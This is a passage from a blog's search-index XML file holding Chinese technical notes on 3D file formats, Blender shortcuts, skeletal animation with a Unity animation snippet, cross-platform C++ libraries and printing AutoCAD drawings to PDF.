<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AndroidManifest.xml文件解析</title>
    <url>/2022/06/29/AndroidManifest-xml%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/xianming01/article/details/7526987" target="_blank" rel="noopener">android基础知识13：AndroidManifest.xml文件解析</a>,by xianming01.</li>
<li><a href="https://cloud.tencent.com/developer/article/1661932" target="_blank" rel="noopener">Android四大组件详解</a>,by 用户7557625.</li>
<li><a href="https://developer.android.com/guide/components/activities/activity-lifecycle?hl=zh-cn" target="_blank" rel="noopener">了解 Activity 生命周期</a>,by Android 开发者.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>3D相关文件扩展名汇总</title>
    <url>/2023/01/12/3D%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<ul>
<li>.flt</li>
</ul>
<p>OpenFlight（或 .flt）是一种 3d 几何模型文件格式，最初由 Software Systems Inc. 在 1988 年为其MultiGen实时 3d 建模包开发。最初称为 Flight，该格式被设计为非专有 3d供实时 3D视觉模拟图像生成器使用的模型格式。</p>
<p>OpenFlight 相对于许多 3d 几何模型文件格式（.obj、.dxf、.3ds）的早期优势是其特定的实时 3d 图形行业设计。 这意味着格式是基于多边形的（而不是NURB曲面），并提供实时 IG 系统所必需的实时树结构。</p>
<p>OpenFlight格式是实时三维视景仿真领域中最为流行的图像生成格式。OpenFlight格式由Presagis（以前称为MultiGen-Paradigm）开发和维护，现在已被3D视觉仿真社区广泛采用为标准格式。3DSMax和Blender等3D建模软件都提供了对FLT文件类型的支持。</p>
<ul>
<li>.tif</li>
</ul>
<p>Tag Image File Format，缩写为TIFF或TIF，是一种用于存储光栅图形图像的图像文件格式，在图形艺术家、出版业、和摄影师中很流行。TIFF 被扫描、传真、文字处理、光学字符识别、图像处理、桌面出版和页面布局应用程序广泛支持。该格式由Aldus Corporation创建，用于桌面出版。它于 1992 年发布了最新版本 6.0，随后更新了Adobe Systems版权在后者于 1994 年收购了 Aldus 之后。一些 Aldus 或 Adob​​e 技术说明已发布，对格式进行了较小的扩展，并且一些规范已基于 TIFF 6.0，包括TIFF/EP (ISO 12234-2)、TIFF/ IT (ISO 12639)、 TIFF-F (RFC 2306) 和 TIFF-FX (RFC 3949)。</p>
<p>TIFF 是一种灵活、适应性强的文件格式，用于在单个文件中处理图像和数据，包括定义图像几何形状的标题标签（大小、定义、图像数据排列、应用的图像压缩）。例如，TIFF 文件可以是包含JPEG（有损）和PackBits（无损）压缩图像的容器。TIFF 文件还可以包含基于矢量的剪切路径（轮廓、剪裁、图像帧）。无损存储图像数据的能力格式使 TIFF 文件成为有用的图像存档，因为与标准 JPEG 文件不同，使用无损压缩（或无压缩）的 TIFF 文件可以在不损失图像质量的情况下进行编辑和重新保存。</p>
<p>可用Adobe PhotoShop软件打开。</p>
<ul>
<li>.hdr</li>
</ul>
<p>高动态范围成像（英语：High Dynamic Range Imaging，简称HDRI或HDR），在计算机图形学与电影摄影术中，是用来实现比普通数位图像技术更大曝光动态范围（即更大的明暗差别）的一组技术。高动态范围成像的目的就是要正确地表示真实世界中从太阳光直射到最暗的阴影这样大的范围亮度。</p>
<p>高动态范围成像最初只用于纯粹由计算机生成的图像。之后又开发出一些从不同曝光范围照片中生成高动态范围图像的方法。随着数字相机的日渐流行以及桌面软件变得易于使用，许多业余摄影师使用高动态范围成像的方法生成高动态范围场景的照片，但是，实际上高动态范围还有许多其它的应用。</p>
<p>可用Adobe PhotoShop软件打开。</p>
<ul>
<li>.mip</li>
</ul>
<p>.mip文件最初为Paint Shop Pro创建的图像文件，这是一个图像编辑程序，现在称为PaintShop Photo Pro。 包含相同的多个分辨率 BMP。 图片; 通常用于纹理映射。MIP文件允许用户存储针对特定大小优化的图形。 这样，就不必拉伸或压缩图像以适合图像。 例如，512x512像素MIP图像还可以包含用于缩略图徽标的32x32像素版本。</p>
<p>可用Adobe PhotoShop软件打开。</p>
<ul>
<li>.gdb</li>
</ul>
<p>ESRI 文件地理数据库 (FileGDB) 是磁盘上文件夹中的文件集合，其中包含相关地理空间数据，例如要素数据集、要素类和关联表。它需要某些其他文件与 .gdb 文件一起保存在同一目录中才能工作。可以在 .gdb 文件上执行查询以管理空间和非空间数据。</p>
<p>查看.gdb文件需要安装arcgis系列软件，使用其中的catalog软件打开。或者参考<a href="https://gis.stackexchange.com/questions/4076/open-source-tool-capable-of-reading-esri-file-geodatabase-gdb" target="_blank" rel="noopener">Open Source Tool capable of reading Esri File Geodatabase (.gdb)?</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://en.wikipedia.org/wiki/OpenFlight" target="_blank" rel="noopener">OpenFlight .flt</a>,by wikipedia.</li>
<li><a href="https://en.wikipedia.org/wiki/TIFF" target="_blank" rel="noopener">TIFF</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E5%8A%A8%E6%80%81%E8%8C%83%E5%9B%B4%E6%88%90%E5%83%8F" target="_blank" rel="noopener">HDR</a>,by wikepedia.</li>
<li><a href="https://zh.m.wikipedia.org/zh-hans/Mipmap" target="_blank" rel="noopener">Mipmap</a>,by wikepedia.</li>
<li><a href="https://docs.fileformat.com/database/gdb/" target="_blank" rel="noopener">.gdb</a>,by fileformat.</li>
<li><a href="https://jingyan.baidu.com/article/7f766dafaacce04100e1d048.html" target="_blank" rel="noopener">.gdb文件如何查看</a>,by baidu.</li>
<li><a href="https://gis.stackexchange.com/questions/4076/open-source-tool-capable-of-reading-esri-file-geodatabase-gdb" target="_blank" rel="noopener">Open Source Tool capable of reading Esri File Geodatabase (.gdb)?</a>,by stackexchange.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title>Blender简易教程</title>
    <url>/2018/09/19/Blender%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>最近需要用Blender建3D模型，试用了半天，将经验简单总结一下。</p>
<h1 id="3D建模流程"><a href="#3D建模流程" class="headerlink" title="3D建模流程"></a>3D建模流程</h1><ul>
<li>建立3D模型：通常在Blender的3D视图窗口对物体进行建模。</li>
<li>拆分制作纹理：设置缝合边，再展开。打开U/V图像编辑器窗口即可看到拆分效果。导出图片后制作纹理。</li>
<li>使用材质贴图：设置材质着色，添加纹理。</li>
</ul>
<h1 id="Blender快捷键"><a href="#Blender快捷键" class="headerlink" title="Blender快捷键"></a>Blender快捷键</h1><p>Blender快捷键很多，熟练使用可加速3D模型的建立。</p>
<h2 id="3D视图窗口"><a href="#3D视图窗口" class="headerlink" title="3D视图窗口"></a>3D视图窗口</h2><h3 id="字母键"><a href="#字母键" class="headerlink" title="字母键"></a>字母键</h3><ul>
<li>A：全选、取消选择</li>
<li>Shift+A：增加物件，新建的物件会出现在准星的位置</li>
<li>B：框选，加Shift取消选择，按Esc退出选择</li>
<li>C：刷选，加Shift取消选择，按Esc退出选择</li>
<li>Shift+C：将游标设置到坐标系中心</li>
<li>Ctrl+Shift+C：为骨头添加约束</li>
<li>Shift+D：复制对象</li>
<li>E：挤出选中对象</li>
<li>Shift+E：编辑模式下，打开对称镜像挤出骨架</li>
<li>F：编辑模式下，在点的基础上构建边或面；在权重绘制模式下，设置笔刷大小</li>
<li>G：移动选中对象</li>
<li>Alt+G: 在Pose Mode下，按“Alt+G”骨架归位</li>
<li>H：隐藏对象（Hide）</li>
<li>Alt+H：显示对象</li>
<li>I：增加关键帧</li>
<li>Ctrl+I：物体模式下，反选所有未选择的物体</li>
<li>Shift+I：在Pose Mode下，选中骨架，再按“Shift+I”插入反关节</li>
<li>Ctrl+J: 在Pose Mode下，连接两个独立的骨架，以便在编辑模式下同时编辑；在Object Mode下，选择两个物件后合并</li>
<li>K: 切割,按“enter”键完成切割。按“k”键接着按住“ctrl”键移动到线框上可以自动定位到线的二分之一处。按“k”键接着按一下“c”键可以水平垂直或者45度进行切割。按“k”键接着按一下“z”键可以对物体一圈进行切割。</li>
<li>Ctrl+L：编辑模式下，选择一个点，在Ctrl+L将选择与点相连的连续表面</li>
<li>M：选中物体，按“M”键，再选择要将物体放置的图层。</li>
<li>N：打开物体属性</li>
<li>Ctrl+P：编辑模式下，设置多个骨头的父骨头；或者物体模式下，设置多个物体的父级。</li>
<li>Alt+P：物体模式下，取消物体的父子关系。</li>
<li>R: 旋转</li>
<li>Alt+R: 在Pose Mode下，按“Alt+R”骨架归位</li>
<li>Ctrl+R: 环切并滑动</li>
<li>S: 缩放</li>
<li>S+XYZ：沿XYZ轴方向缩放</li>
<li>Alt+S：法向缩放</li>
<li>T：打开左侧工具栏</li>
<li>U：编辑模式下按“U”，打开UV映射菜单,选择活动面再全选，然后UV展开</li>
<li>Ctrl+U:存储为启动文件</li>
<li>W：快捷拓展命令栏</li>
<li>X：删除</li>
<li>Z：线框模式与实体模式之间切换</li>
<li>Shift+Z：视口着色切换到实时渲染模式</li>
<li>]：在Pose模式下，选择主骨头，再按“]”可直接选择下一根骨头</li>
<li>Shift+]：在Pose模式下，选择主骨头，再按“Shift+]”可直接选择下一根骨头</li>
<li>Ctrl+Space：调出三维坐标系操纵物体</li>
<li>Ctrl+Tab：进行点、线、面的编辑模式</li>
<li>Ctrl+Alt+Q：切换四视图</li>
<li>Ctrl+向上箭头：最大化对应视图</li>
<li>Shift+空格键：放大视图</li>
<li>Tab：编辑模式和物体模式切换</li>
<li>Ctrl+句号.：仅变换原点</li>
</ul>
<h3 id="功能键"><a href="#功能键" class="headerlink" title="功能键"></a>功能键</h3><ul>
<li>F12：计算结果（算图模式），如果是黑色的，需要把摄像机和光源放在同一个图层中，或者选择摄像机和光源的图层。</li>
</ul>
<h3 id="数字键"><a href="#数字键" class="headerlink" title="数字键"></a>数字键</h3><p>数字键主要用于视角切换</p>
<ul>
<li>1：前视图</li>
<li>3：侧视图</li>
<li>5：正交与透视之间切换</li>
<li>7：俯视图</li>
</ul>
<h3 id="鼠标键"><a href="#鼠标键" class="headerlink" title="鼠标键"></a>鼠标键</h3><ul>
<li>右键：选择物体</li>
<li>shift+中键：平移</li>
<li>滚轴/（Ctrl+中键拖拽）：缩放</li>
</ul>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://blog.csdn.net/u010670734/article/details/64538633" target="_blank" rel="noopener"> Blender常用快捷键</a>,by JinunMeng.</li>
<li><a href="https://www.zhihu.com/question/41303546" target="_blank" rel="noopener">如何系统的学习blender？</a>,by zhihu.</li>
<li><a href="https://www.zhihu.com/question/25745472" target="_blank" rel="noopener">贴图、纹理、材质的区别是什么？</a>,by zhihu.</li>
<li><a href="https://www.cnblogs.com/MATU/p/4553916.html" target="_blank" rel="noopener">材质、贴图、纹理的区别</a>,by MATU.</li>
<li><a href="https://blog.csdn.net/zhuyong006/article/details/83216897" target="_blank" rel="noopener">材质和纹理的区别</a>,by zhuyong006.</li>
<li><a href="https://www.uegeek.com/190608-material-texture-shaders.html" target="_blank" rel="noopener">一文看懂材质/纹理 Material, Texture, Shading, Shader 的区别</a>,by kidult00.</li>
<li><a href="https://www.cnblogs.com/w-wanglei/p/6716565.html" target="_blank" rel="noopener">Blender 移动、旋转、缩放</a>,by heavi.</li>
<li><a href="https://www.jianshu.com/p/94b8a869b29b" target="_blank" rel="noopener">数字人轻松学习Blender系列之七：坐标</a>,by DIGITALMAN.</li>
<li><a href="https://juejin.cn/post/7135162453461041189" target="_blank" rel="noopener">【转载】Blender 常用快捷键大全</a>,by ShaderJoy.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title>3D模型动画分类及其使用</title>
    <url>/2019/12/28/3D%E6%A8%A1%E5%9E%8B%E5%8A%A8%E7%94%BB%E5%88%86%E7%B1%BB%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>3DMax、Blender之类的3D建模软件易学难精，其原因在于很多人不了解其背后的计算机图形学原理。因此，掌握相关的计算机图形学原理和知识，对于我们熟练运用3D建模软件是十分必要的。下面简单介绍3D模型的分类及其使用方法。</p>
<h1 id="3D模型动画分类"><a href="#3D模型动画分类" class="headerlink" title="3D模型动画分类"></a>3D模型动画分类</h1><blockquote>
<p><strong>3D模型动画的基本原理是让模型中各顶点的位置随时间变化。</strong> 主要种类有Morph（变形）动画，关节动画和骨骼蒙皮动画(SkinnedMesh)。从动画数据的角度来说，三者一般都采用关键帧技术，即只给出关键帧的数据，其他帧的数据使用插值得到。但由于这三种技术的不同，关键帧的数据是不一样的。</p>
</blockquote>
<h2 id="变形动画"><a href="#变形动画" class="headerlink" title="变形动画"></a>变形动画</h2><blockquote>
<p>Morph（渐变，变形）动画是直接指定动画每一帧的顶点位置，其动画关键中存储的是Mesh所有顶点在关键帧对应时刻的位置。</p>
</blockquote>
<h2 id="关节动画"><a href="#关节动画" class="headerlink" title="关节动画"></a>关节动画</h2><blockquote>
<p>关节动画的模型不是一个整体的Mesh,而是分成很多部分(Mesh)，通过一个父子层次结构将这些分散的Mesh组织在一起，父Mesh带动其下子Mesh的运动，各Mesh中的顶点坐标定义在自己的坐标系中，这样各个Mesh是作为一个整体参与运动的。</p>
</blockquote>
<blockquote>
<p>动画帧中设置各子Mesh相对于其父Mesh的变换（主要是旋转，当然也可包括移动和缩放），通过子到父，一级级的变换累加（当然从技术上，如果是矩阵操作是累乘）得到该Mesh在整个动画模型所在的坐标空间中的变换（从本文的视角来说就是世界坐标系了，下同），从而确定每个Mesh在世界坐标系中的位置和方向，然后以Mesh为单位渲染即可。</p>
</blockquote>
<blockquote>
<p>关节动画的问题是，各部分Mesh中的顶点是固定在其Mesh坐标系中的，这样在两个Mesh结合处就可能产生裂缝。</p>
</blockquote>
<h2 id="骨骼蒙皮动画"><a href="#骨骼蒙皮动画" class="headerlink" title="骨骼蒙皮动画"></a>骨骼蒙皮动画</h2><blockquote>
<p>骨骼蒙皮动画即SkinnedMesh了，骨骼蒙皮动画的出现解决了关节动画的裂缝问题。骨骼动画的基本原理可概括为：在骨骼控制下，通过顶点混合动态计算蒙皮网格的顶点，而骨骼的运动相对于其父骨骼，并由动画关键帧数据驱动。</p>
</blockquote>
<blockquote>
<p>一个骨骼动画通常包括骨骼层次结构数据，网格(Mesh)数据，网格蒙皮数据(skin info)和骨骼的动画(关键帧)数据。</p>
</blockquote>
<h3 id="SkinnedMesh原理"><a href="#SkinnedMesh原理" class="headerlink" title="SkinnedMesh原理"></a>SkinnedMesh原理</h3><blockquote>
<p>SkinnedMesh中文一般称作骨骼蒙皮动画，正如其名，这种动画中包含骨骼（Bone）和蒙皮(Skinned Mesh)两个部分，Bone的层次结构和关节动画类似，Mesh则和关节动画不同：</p>
</blockquote>
<blockquote>
<p>关节动画中是使用多个分散的Mesh,而Skinned Mesh中Mesh是一个整体，也就是说只有一个Mesh,实际上如果没有骨骼让Mesh运动变形，Mesh就和静态模型一样了。</p>
</blockquote>
<blockquote>
<p>Skinned Mesh技术的精华在于蒙皮，所谓的皮并不是模型的贴图（也许会有人这么想过吧），而是Mesh本身，蒙皮是指将Mesh中的顶点附着（绑定）在骨骼之上，而且每个顶点可以被多个骨骼所控制，这样在关节处的顶点由于同时受到父子骨骼的拉扯而改变位置就消除了裂缝。</p>
</blockquote>
<blockquote>
<p>Skinned Mesh这个词从字面上理解似乎是有皮的模型，哦，如果贴图是皮，那么普通静态模型不也都有吗？所以我觉得应该理解为具有蒙皮信息的Mesh或可当做皮肤用的Mesh，这个皮肤就是Mesh。而为了有皮肤功能，Mesh还需要蒙皮信息，即Skin数据，没有Skin数据就是一个普通的静态Mesh了。</p>
</blockquote>
<blockquote>
<p>Skin数据决定顶点如何绑定到骨骼上。顶点的Skin数据包括顶点受哪些骨骼影响以及这些骨骼影响该顶点时的权重(weight)，另外对于每块骨骼还需要骨骼偏移矩阵(BoneOffsetMatrix)用来将顶点从Mesh空间变换到骨骼空间。</p>
</blockquote>
<h3 id="SkinnedMesh结构"><a href="#SkinnedMesh结构" class="headerlink" title="SkinnedMesh结构"></a>SkinnedMesh结构</h3><ul>
<li>骨骼决定了模型整体在世界坐标系中的位置和朝向。</li>
</ul>
<blockquote>
<p>先看看静态模型吧，静态模型没有骨骼，我们在世界坐标系中放置静态模型时，只要指定模型自身坐标系在世界坐标系中的位置和朝向。在骨骼动画中，不是把Mesh直接放到世界坐标系中，Mesh只是作为Skin使用的，是依附于骨骼的，真正决定模型在世界坐标系中的位置和朝向的是骨骼。</p>
</blockquote>
<blockquote>
<p>在渲染静态模型时，由于模型的顶点都是定义在模型坐标系中的，所以各顶点只要经过模型坐标系到世界坐标系的变换后就可进行渲染。而对于骨骼动画，我们设置模型的位置和朝向，实际是在设置根骨骼的位置和朝向，然后根据骨骼层次结构中父子骨骼之间的变换关系计算出各个骨骼的位置和朝向，然后根据骨骼对Mesh中顶点的绑定计算出顶点在世界坐标系中的坐标，从而对顶点进行渲染。要记住，在骨骼动画中，骨骼才是模型主体，Mesh不过是一层皮，一件衣服。</p>
</blockquote>
<ul>
<li>骨骼可理解为一个坐标空间。</li>
</ul>
<blockquote>
<p>骨骼只是一个形象的说法，实际上骨骼可理解为一个坐标空间，关节可理解为骨骼坐标空间的原点。关节的位置由它在父骨骼坐标空间中的位置描述。上图中有三块骨骼，分别是上臂，前臂和两个手指。Clavicle(锁骨)是一个关节，它是上臂的原点，同样肘关节(elbow joint)是前臂的原点，腕关节(wrist)是手指骨骼的原点。关节既决定了骨骼空间的位置，又是骨骼空间的旋转和缩放中心。</p>
</blockquote>
<blockquote>
<p>骨骼就是坐标空间，骨骼层次就是嵌套的坐标空间。关节只是描述骨骼的位置即骨骼自己的坐标空间原点在其父空间中的位置，绕关节旋转是指骨骼坐标空间（包括所有子空间）自身的旋转。</p>
</blockquote>
<blockquote>
<p>但还有两个可能的疑问，一是骨骼的长度问题，由于骨骼是坐标空间，没有所谓的长度和宽度的限制，我们看到的长度一方面是蒙皮后的结果，另一方面子骨骼的原点（也就是关节）的位置往往决定了视觉上父骨骼的长度，比如这里upper arm线段的长度实际是由elbow joint的位置决定的。</p>
</blockquote>
<blockquote>
<p>第二个问题，手指的那个端点是啥啊？实际上在我们的例子中手指没有子骨骼，所以那个端点并不存在：）那是为了方便演示画上去的。实际问题中总有最下层的骨骼，他们不能决定其他骨骼了，他们的作用只剩下控制Mesh顶点。对了，那么手指的长度如何确定？我们看到的长度应该是由蒙皮决定的，也就是由Mesh中属于手指的那些点离腕关节的距离决定。</p>
</blockquote>
<h1 id="3D模型动画使用"><a href="#3D模型动画使用" class="headerlink" title="3D模型动画使用"></a>3D模型动画使用</h1><p>下面给出一段在Unity3D中控制3D模型动画的代码，作为参考。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">using UnityEngine;</span><br><span class="line">using System.Collections;</span><br><span class="line"> </span><br><span class="line">public class AnimationScript : MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">        Animation animation &#x3D; this.animation;&#x2F;&#x2F;动画控制器</span><br><span class="line">        animation.Play(&quot;idle&quot;);&#x2F;&#x2F;上来直接播放idle动画</span><br><span class="line">    &#125;</span><br><span class="line">    void OnGUI()</span><br><span class="line">    &#123;</span><br><span class="line">        if (GUI.Button(new Rect(0, 0, 100, 30), &quot;行走&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            animation.Play(&quot;run&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (GUI.Button(new Rect(100, 0, 100, 30), &quot;停止&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            animation.Play(&quot;idle&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (GUI.Button(new Rect(200, 0, 100, 30), &quot;攻击&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            animation.Play(&quot;attack&quot;);</span><br><span class="line">            animation.PlayQueued(&quot;idle&quot;);&#x2F;&#x2F;播放完attack之后再播放idle</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://gameinstitute.qq.com/community/detail/127900" target="_blank" rel="noopener">骨骼蒙皮动画(SkinnedMesh)的原理解析</a>,by feng.</li>
<li><a href="https://blog.csdn.net/yongh701/article/details/73001312" target="_blank" rel="noopener">【Unity3D】3D模型的使用——FBX的使用与Animation设置</a>,by yongh701.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++跨平台移植开发思考</title>
    <url>/2018/07/16/CPP%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%A7%BB%E6%A4%8D%E5%BC%80%E5%8F%91%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>最近需要将一份C++代码通过Emscripten编译成asm.js，结果失败，因为这份C++代码使用MFC GUI库，导致Emscripten编译失败。这引起了我对C++跨平台移植的思考。</p>
<p>C++代码理论上能实现源代码级别的跨平台移植，即同一份代码可以不加修改的在不同的平台上编译运行且表现一致。这要求编写的C++代码符合跨平台移植的规范，如链接[1]所指出的那样，它给出了很多实现C++代码跨平台移植的编码细节，在编写跨平台的底层库方面十分有用。但在编写跨平台的C++应用方面，应使用经过长期实践证明能用的跨平台库来帮助编码，建立在巨人的肩膀上，使跨平台C++代码编写工作变得简单容易。下面给出一些常用的跨平台C++库供参考：</p>
<ol>
<li>语言及基础库</li>
</ol>
<ul>
<li>标准 C++：标准 c++ 是98年制定的，现在主流的 c++ 编译器都能够比较好的支持了。这里建议使用VC7.1和GCC4.0及以上版本。在Linux中，glibc是标准C的实现，libstdc++则是标准C++的实现。在Windows中，VS2015之前MSVCRT.DLL是标准C/C++的实现，之后UCRTBASE.DLLz则是标准C/C++的实现。</li>
<li>boost：boost 则是 C++ 标准委员会的一群人弄起来的一个 C++ 库集合，其中不少库以经进入 C++ TR1，可以说是准标准。使用这里的库我们有着充分的理由。象字符串的操作可以用 boost 的 String algorithms 库，格式化操作可以用 boost::format，正则式可用 boost::regex 等等。</li>
</ul>
<ol start="2">
<li>网络</li>
</ol>
<ul>
<li>ACE（Adaptive Communication Environment）：ACE是一个以C++的Template技术所做成的开放源代码的可跨平台的网络应用程序的程式库套件。ACE自适配通信环境（ADAPTIVE Communication Environment）是可以自由使用、开放源码的面向对象（OO）框架（Framework），在其中实现了许多用于并发通信软件的核心模式。ACE提供了一组丰富的可复用C++ Wrapper Facade（包装外观）和框架组件，可跨越多种平台完成通用的通信软件任务，其中包括：事件多路分离和事件处理器分派、信号处理、服务初始化、进程间通信、共享内存管理、消息路由、分布式服务动态（重）配置、并发执行和同步，等等。</li>
<li>Boost.Asio：用于网络和底层I/O编程的跨平台的C++库</li>
</ul>
<ol start="3">
<li>数据库</li>
</ol>
<ul>
<li>OTL (Oracle, Odbc and DB2-CLI Template Library)：<br>不但支持跨平台，还跨数据库。OTL支持以下面的数据库 : OTL Oracle ,SQL Server, Access, MySQL。还有其它的库如DTL，这个库不但支持ODBC，它还支持数据库的原生接口，可以有更佳的性能。</li>
</ul>
<ol start="4">
<li>GUI</li>
</ol>
<ul>
<li>QT：QT是双认证的，当你的程序免费时它就免费，你的程序打算卖钱时，它也要，而且要价很高。所以，如果有版权，成本上的考虑的话，则可以考虑wxWidgets。</li>
<li>wxWidgets：wxWidgets（/wɪksˈwɪdʒɪts/，原名wxWindows）是一个开放源代码且跨平台的对象工具集（widget toolkit），其库可用来创建基本的图形用户界面（GUI）。wxWidgets由Julian Smart于1992年首先开发。</li>
</ul>
<ol start="5">
<li>科学计算</li>
</ol>
<ul>
<li>GSL：GNU科学库。</li>
</ul>
<ol start="6">
<li>游戏开发</li>
</ol>
<ul>
<li>Cocos2d-x：一个跨平台框架，用于构建2D游戏，互动图书，演示和其他图形应用程序。</li>
</ul>
<ol start="7">
<li>视频</li>
</ol>
<ul>
<li>FFmpeg：一个完整的，跨平台的解决方案，用于记录，转换视频和音频流</li>
</ul>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="http://hongbomin.com/2017/03/08/cpp-cross-platform-guide/" target="_blank" rel="noopener">c++跨平台移植指南</a>, by 洪柏敏.</li>
<li><a href="https://zh.wikipedia.org/wiki/ACE自适配通信环境" target="_blank" rel="noopener">ACE自适配通信环境</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/weiwangchao_/article/details/51130863" target="_blank" rel="noopener">C++库汇总</a>, by 工程师WWW.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25443704" target="_blank" rel="noopener">值得推荐的C/C++框架和库</a>, by zhihu.</li>
<li><a href="https://blog.csdn.net/xiexievv/article/details/6831194" target="_blank" rel="noopener">printf 格式化输出符号详细说明</a>,by jackytse_.</li>
<li><a href="https://www.yanbinghu.com/2018/09/15/43741.html" target="_blank" rel="noopener">理一理字节对齐的那些事</a>,by 守望.</li>
<li><a href="http://www.veryitman.com/2019/03/07/%E4%B8%8D%E8%A7%81%E5%BE%97%E4%BD%A0%E4%BC%9A%E8%AE%A1%E7%AE%97C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6/" target="_blank" rel="noopener">不见得你会计算C字符串长度</a>,by veryitman.</li>
<li><a href="https://blog.csdn.net/Mary19920410/article/details/71518130" target="_blank" rel="noopener">浅析C语言之uint8_t / uint16_t / uint32_t /uint64_t</a>,by 海阔天空sky1992.</li>
<li><a href="https://blog.csdn.net/m0_37751179/article/details/78801497" target="_blank" rel="noopener">char，int，float，double所占字节数</a>,by 张小铭.</li>
<li><a href="https://www.runoob.com/w3cnote/cpp-time_t.html" target="_blank" rel="noopener">c++ 时间类型详解 time_t</a>,by runoob.</li>
<li><a href="https://www.cnblogs.com/my_life/articles/5787195.html" target="_blank" rel="noopener">网络传输——序列化</a>,by bw_0927.</li>
<li><a href="https://zhuanlan.zhihu.com/p/59450618" target="_blank" rel="noopener">干货：构建C/C++良好的工程结构</a>,by Froser.</li>
<li><a href="https://blog.csdn.net/wangnan537/article/details/45222653" target="_blank" rel="noopener">UTF-8与UTF-8 without BOM</a>,by 苏州-微尘.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>AutoCAD简单教程</title>
    <url>/2023/01/15/AutoCAD%E7%AE%80%E5%8D%95%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>最近需要将一个autocad的dwg文件转成pdf，简单记录流程。</p>
<h1 id="确定生成dwg的autocad版本"><a href="#确定生成dwg的autocad版本" class="headerlink" title="确定生成dwg的autocad版本"></a>确定生成dwg的autocad版本</h1><p>使用vscode打开dwg二进制文件，查看其文件头。参考<a href="https://knowledge.autodesk.com/zh-hans/support/autocad/learn-explore/caas/sfdcarticles/sfdcarticles/CHS/drawing-version-codes-for-autocad.html" target="_blank" rel="noopener">AutoCAD的图形格式版本代号</a>确定生成该dwg文件的autocad版本，并下载autocad2017。</p>
<h1 id="打印cad图纸"><a href="#打印cad图纸" class="headerlink" title="打印cad图纸"></a>打印cad图纸</h1><p>先跟随教程<a href="https://zhuanlan.zhihu.com/p/34532045" target="_blank" rel="noopener">AutoCAD快速上手，只需要10分钟！</a>简单熟悉一下autocad的界面，了解基本概念，如模型、布局等。</p>
<p>打印cad图纸的步骤参考<a href="https://m.yukx.com/autocad/article/details/2080.html" target="_blank" rel="noopener">AutoCAD如何设置打印想要的区域输出jpg等格式</a>，具体为：</p>
<ol>
<li>使用鼠标左键选中要打印的模型，使用鼠标右键打开图纸的上下文菜单，选择“隔离对象”后，模型窗口中就只剩需要打印的模型。</li>
<li>点击“打印”，打开打印窗口，将模型打印成pdf。</li>
<li>结束对象隔离。</li>
<li>选择新的要打印的模型，重复步骤1到3。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://knowledge.autodesk.com/zh-hans/support/autocad/learn-explore/caas/sfdcarticles/sfdcarticles/CHS/drawing-version-codes-for-autocad.html" target="_blank" rel="noopener">AutoCAD的图形格式版本代号</a>,by autodesk.</li>
<li><a href="https://zhuanlan.zhihu.com/p/34532045" target="_blank" rel="noopener">AutoCAD快速上手，只需要10分钟！</a>,by CAD君.</li>
<li><a href="https://m.yukx.com/autocad/article/details/2080.html" target="_blank" rel="noopener">AutoCAD如何设置打印想要的区域输出jpg等格式</a>,by autocad.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>C++常用库简介</title>
    <url>/2019/11/15/CPlusCPlus%E5%B8%B8%E7%94%A8%E5%BA%93%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>为熟练使用C++创建项目，应掌握常用的C++库。现总结常用的C++库如下：</p>
